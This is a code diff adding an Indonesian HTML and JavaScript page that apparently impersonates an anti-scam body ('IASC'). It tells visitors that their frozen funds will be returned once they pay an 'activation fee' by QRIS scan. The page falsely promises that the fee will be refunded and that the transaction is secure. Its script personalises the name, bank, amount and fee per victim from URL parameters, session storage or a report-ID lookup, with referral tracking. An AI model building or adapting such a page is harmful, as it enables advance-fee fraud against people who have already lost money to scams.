@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover"/>
+<title>Aktivasi Rekening</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="activasi.css">
+</head>
+<body>
+
+<div class="container">
+    <div class="top-shape"></div>
+    <div class="shield">
+        <img src="https://cdn-icons-png.flaticon.com/512/190/190411.png">
+    </div>
+ 
+    <div class="title">AKTIVASI REKENING</div>
+    <div class="info-box">
+        <div class="info-icon">i</div>
+        <div class="info-text">
+            Silahkan aktivasi rekening penerima
+            jika benar anda pemilik rekening tersebut untuk menerima kembali saldo yang telah di bekukan oleh pihak IASC A/n
+            <b id="act-nama">—</b> -
+            <b id="act-bank">—</b> sebesar
+            <b id="act-saldo-masuk">—</b>
+        </div>
+    </div>
+
+    <div class="scan-title">
+        <span>SCAN QR UNTUK AKTIVASI</span>
+    </div>
+    <div class="qr-box">
+        <img id="act-qr" src="QR.png" alt="QR aktivasi pembayaran">
+        <p id="act-qr-hint" class="qr-hint" hidden>QR QRIS</p>
+    </div>
+    <div class="detail-box">
+        <div class="row">
+            <div class="left">
+                <div class="circle">Rp</div>
+                Nominal Aktivasi
+            </div>
+            <div class="right blue" id="act-nominal-aktivasi">
+                —
+            </div>
+        </div>
+        <div class="row">
+            <div class="left">
+                <div class="circle">⌘</div>
+                Metode Aktivasi
+            </div>
+            <div class="right">
+                QRIS / Scan QR
+            </div>
+        </div>
+        <div class="row">
+            <div class="left">
+                <div class="circle">👤</div>
+                Penerima
+            </div>
+            <div class="right bold" id="act-penerima-nama">
+                —
+            </div>
+        </div>
+    </div>
+    <div class="warning">
+        <div class="warning-icon">!</div>
+        <p>
+            Note : Biaya aktivasi tetap akan kembali bersama saldo yang telah di bekukan untuk di terima kembali ke rekening anda.<br><br>
+            <b>Pastikan nominal sesuai sebelum melakukan pembayaran.</b>
+        </p>
+    </div>
+    <div class="footer">
+        🔒 Transaksi aman dan terenkripsi
+    </div>
+</div>
+
+<script src="iasc-data.js"></script>
+<script src="../../assets/guest/iasc-app-url.js"></script>
+<script src="../../assets/guest/iasc-referral.js"></script>
+<script>
+(function () {
+    function setText(id, text) {
+        var el = document.getElementById(id);
+        if (el && text !== undefined && text !== null && text !== "") {
+            el.textContent = text;
+        }
+    }
+
+    function formatNum(v) {
+        var n = parseInt(String(v).replace(/[^\d]/g, ""), 10) || 0;
+        return n.toLocaleString("id-ID");
+    }
+
+    function fillActivasiData(d) {
+        if (!d) {
+            return;
+        }
+        if (d.totalFormatted) {
+            setText("act-saldo-masuk", "Rp" + d.totalFormatted + ",-");
+        }
+        if (d.receiverBank) {
+            setText("act-bank", d.receiverBank);
+        }
+        if (d.receiverName) {
+            setText("act-nama", d.receiverName);
+            setText("act-penerima-nama", d.receiverName);
+        }
+        if (d.feeFormatted) {
+            setText("act-nominal-aktivasi", "Rp" + d.feeFormatted + ",-");
+        }
+        var qrImg = document.getElementById("act-qr");
+        var qrHint = document.getElementById("act-qr-hint");
+        if (d.qrUrl && qrImg) {
+            var q = d.qrUrl.indexOf("?") >= 0 ? d.qrUrl.substring(d.qrUrl.indexOf("?")) : "";
+            var src = "../../Guest/qr_image.php" + q;
+            if (typeof iascGuestUrl === "function") {
+                src = iascGuestUrl("qr_image.php" + q);
+            } else if (typeof iascAppUrl === "function") {
+                src = iascAppUrl("/Guest/qr_image.php" + q);
+            }
+            qrImg.src = src;
+            qrImg.alt = "QR aktivasi — anggota " + (d.anggotaKode || "");
+            qrImg.onerror = function () {
+                if (typeof iascAppUrl === "function" && qrImg.src.indexOf("qr_image.php") >= 0) {
+                    qrImg.onerror = null;
+                    qrImg.src = iascAppUrl("/Guest/qr_image.php" + q);
+                }
+            };
+            if (qrHint) {
+                qrHint.hidden = true;
+            }
+        } else if (d.qrImage && qrImg) {
+            qrImg.src = d.qrImage;
+            if (qrHint) {
+                qrHint.hidden = true;
+            }
+        } else if (qrHint) {
+            qrHint.hidden = false;
+        }
+    }
+
+    if (window.__ACTIVASI_DATA__) {
+        fillActivasiData(window.__ACTIVASI_DATA__);
+        return;
+    }
+
+    var stored = null;
+    if (typeof iascLoadActivasiPrefill === "function") {
+        stored = iascLoadActivasiPrefill();
+    } else {
+        try {
+            var raw = sessionStorage.getItem("iasc_activasi_prefill");
+            stored = raw ? JSON.parse(raw) : null;
+        } catch (e) {}
+    }
+    if (stored) {
+        fillActivasiData(stored);
+        return;
+    }
+
+    var params = new URLSearchParams(window.location.search);
+    var nama = params.get("nama");
+    var bank = params.get("bank");
+    var saldo = params.get("saldo");
+    if (nama || bank || saldo) {
+        fillActivasiData({
+            receiverName: nama || "",
+            receiverBank: bank || "",
+            totalFormatted: formatNum(saldo),
+            feeFormatted: formatNum(params.get("aktivasi") || String(iascGetBiayaAktivasi())),
+            qrImage: params.get("qr") || "QR.png",
+        });
+        return;
+    }
+
+    var lid = params.get("laporan_id");
+    if (!lid || !/^\d+$/.test(lid)) {
+        return;
+    }
+    var prefillQs =
+        "laporan_id=" + encodeURIComponent(lid) + "&sumber=activasi";
+    if (typeof iascGetRef === "function") {
+        var refNow = iascGetRef();
+        if (refNow) {
+            prefillQs += "&ref=" + encodeURIComponent(refNow);
+        }
+    }
+    fetch("../prefill.php?" + prefillQs, {
+        credentials: "same-origin",
+    })
+        .then(function (r) {
+            return r.json();
+        })
+        .then(function (data) {
+            if (!data || !data.ok || !data.activasi) {
+                return;
+            }
+            fillActivasiData(data.activasi);
+        })
+        .catch(function () {});
+})();
+</script>
+
+</body>
+</html>
